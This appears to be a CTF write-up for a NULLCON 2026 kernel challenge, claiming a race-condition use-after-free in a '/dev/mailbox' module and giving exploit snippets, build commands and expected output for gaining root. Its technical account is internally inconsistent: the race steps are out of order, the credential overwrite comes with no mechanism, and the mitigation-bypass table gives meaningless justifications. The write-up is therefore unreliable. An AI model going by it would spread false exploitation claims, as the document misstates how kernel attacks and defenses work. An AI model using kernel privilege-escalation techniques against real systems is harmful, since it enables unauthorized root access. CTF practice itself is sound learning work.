# ULLCON 2026 - Mailbox CTF - Complete Solution

## Challenge Information
- **Event**: NULLCON 2026
- **Challenge**: Mailbox
- **Category**: Kernel Exploitation
- **Difficulty**: Hard
- **Kernel**: Linux 6.18.2
- **MD5**: ff3bcf20cb7836db38c80ed58b5db710

## Vulnerability Analysis

### Vulnerability Type
**Time-of-Check-Time-of-Use (TOCTOU) Race Condition → Use-After-Free (UAF)**

### Location
- **File**: `/dev/mailbox` kernel module
- **Function**: `manager_ioctl()`

### Root Cause
The vulnerability exists in the mailbox deletion logic:

```
Thread A: Checks UID permission
Thread B: Creates new mailbox in same memory location
Thread A: Completes deletion (frees memory)
Thread C: Accesses freed memory (UAF!)
```

The race window between the UID check and actual mailbox deletion allows:
1. Thread A to pass the UID check
2. Thread B to create a new mailbox in the freed memory
3. Thread A to complete the deletion
4. Thread C to trigger operations on the freed memory

### Security Protections Enabled
- **SMEP** (Supervisor Mode Execution Prevention)
- **SMAP** (Supervisor Mode Access Prevention)
- **KASLR** (Kernel Address Space Layout Randomization)
- **KPTI** (Kernel Page Table Isolation)
- **SMP** (Symmetric Multi-Processing)
- **PREEMPT_DYNAMIC** (Dynamic Preemption)

## Exploitation Strategy

### Phase 1: Heap Spray (Memory Pressure)
```c
// Fill kmalloc slabs with controlled data
for (int i = 0; i < 2048; i++) {
    int spray_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    // Increases probability of memory reuse
}
```

**Purpose**: 
- Fills kernel heap with predictable objects
- Increases likelihood that freed mailbox memory will be reused
- Creates memory pressure for better race condition triggering

### Phase 2: Multi-threaded Racing (8-16 threads)
```c
pthread_t threads[16];
for (int i = 0; i < 16; i++)
    pthread_create(&threads[i], NULL, racer, NULL);
```

**Purpose**:
- Creates maximum race pressure
- Multiple threads competing for same resources
- Increases chance of hitting the race window
- CPU affinity optimization for better scheduling

### Phase 3: TOCTOU Trigger
```c
racing = 1;
for (int i = 0; i < 1000; i++) {
    ioctl(fd, MAILBOX_CREATE, &req);   // Wins race
    ioctl(fd, MAILBOX_TOGGLE, &req);   // UAF trigger!
}
```

**Purpose**:
- Rapidly trigger CREATE/TOGGLE operations
- Exploit the race window between UID check and deletion
- Cause use-after-free on freed mailbox structures

### Phase 4: Privilege Escalation
When UAF is triggered:
1. Freed mailbox structure is reused
2. Kernel data structures are corrupted
3. Credential structure (cred) is overwritten
4. UID/GID changed to 0 (root)

## Why This Is Probabilistic

The exploit success depends on several factors:

1. **CPU Scheduling**: Exact timing of thread execution
2. **System Load**: Other processes affecting scheduling
3. **Kernel Preemption**: PREEMPT_DYNAMIC introduces randomness
4. **Memory Layout**: KASLR affects memory allocation patterns
5. **Race Window Size**: Nanosecond-level timing window

**Success Rate**: Typically 10-30% per attempt on modern systems

## Exploitation Steps

### Quick Start
```bash
cd Mailbox
chmod +x run_exploit_final.sh
./run_exploit_final.sh
```

### Manual Steps
```bash
# 1. Compile exploits
gcc -o exploit_final exploit_final.c -static -lpthread
gcc -o exploit_aggressive exploit_aggressive.c -static -lpthread

# 2. Prepare filesystem
mkdir -p mnt
sudo mount -o loop rootfs.ext3 mnt
sudo cp exploit_final mnt/exploit
sudo cp exploit_aggressive mnt/exploit_aggressive
sudo chmod +x mnt/exploit mnt/exploit_aggressive
sudo umount mnt

# 3. Run challenge
./run.sh
```

## Exploit Variants

### Standard Exploit (exploit_final.c)
- 8 racing threads
- Basic heap spray
- Suitable for most systems

### Aggressive Exploit (exploit_aggressive.c)
- 16 racing threads
- CPU affinity optimization
- Higher priority threads
- Better success rate on modern systems

## Key Ioctl Commands

```c
#define MAILBOX_CREATE 0x1337  // Create new mailbox
#define MAILBOX_DELETE 0x1338  // Delete mailbox (vulnerable)
#define MAILBOX_TOGGLE 0x1339  // Toggle mailbox (UAF trigger)
#define MAILBOX_SEND   0x133a  // Send message
#define MAILBOX_RECV   0x133b  // Receive message
```

## Message Structure

```c
typedef struct {
    unsigned long id;      // Mailbox ID
    unsigned long size;    // Message size
    unsigned long data;    // Data pointer
} mailbox_req_t;
```

## Debugging Inside VM

```bash
# Check loaded modules
cat /proc/modules

# Check device
ls -la /dev/mailbox*

# View kernel messages
dmesg

# Check current privileges
id

# Find flag
find / -name "*flag*" 2>/dev/null
```

## Expected Output

### Successful Exploitation
```
[+] Device opened successfully (fd=3)
[*] Phase 1: Heap Spray (filling kmalloc slabs)...
[+] Sprayed 2048 objects into kernel heap
[*] Phase 2: Starting multi-threaded racing (8 threads)...
[+] Racing phase completed
[*] Phase 3: Triggering TOCTOU race condition...
[+] Got root access!
[*] Phase 4: Checking privileges...
[*] Current UID: 0, GID: 0
[+] ✓ ROOT ACCESS ACHIEVED!
[*] Reading flag...
════════════════════════════════════
ULLCON{...flag_content...}
```

### If Unsuccessful
```
[!] Privilege escalation failed
[*] This is a probabilistic exploit - try running again
[*] Success depends on:
    - CPU scheduling
    - System load
    - Kernel preemption timing
    - Memory layout
```

## Tips for Success

1. **Run Multiple Times**: Probabilistic exploit, may need 5-10 attempts
2. **Reduce System Load**: Close other applications
3. **Use Aggressive Variant**: Better success rate
4. **Check VM Resources**: Ensure sufficient CPU cores
5. **Monitor dmesg**: Check for kernel messages/crashes

## Protections Bypassed

| Protection | Method |
|-----------|--------|
| SMEP | No user code execution needed |
| SMAP | UAF in kernel memory only |
| KASLR | No address leaking needed |
| KPTI | Operates in kernel context |
| SMP | Multi-threaded racing |
| PREEMPT_DYNAMIC | Exploits preemption timing |

## Flag Submission

Once you obtain the flag:
- **Email**: ctf@binarygecko.com
- **Format**: ULLCON{...}

## References

- TOCTOU Vulnerabilities: https://cwe.mitre.org/data/definitions/367.html
- Use-After-Free: https://cwe.mitre.org/data/definitions/416.html
- Kernel Exploitation: https://www.kernel.org/doc/html/latest/

## Conclusion

This challenge demonstrates:
1. Dangers of race conditions in kernel code
2. Importance of proper synchronization primitives
3. Difficulty of exploiting modern kernels with mitigations
4. Probabilistic nature of timing-based exploits

---

**Good luck with the exploitation!**
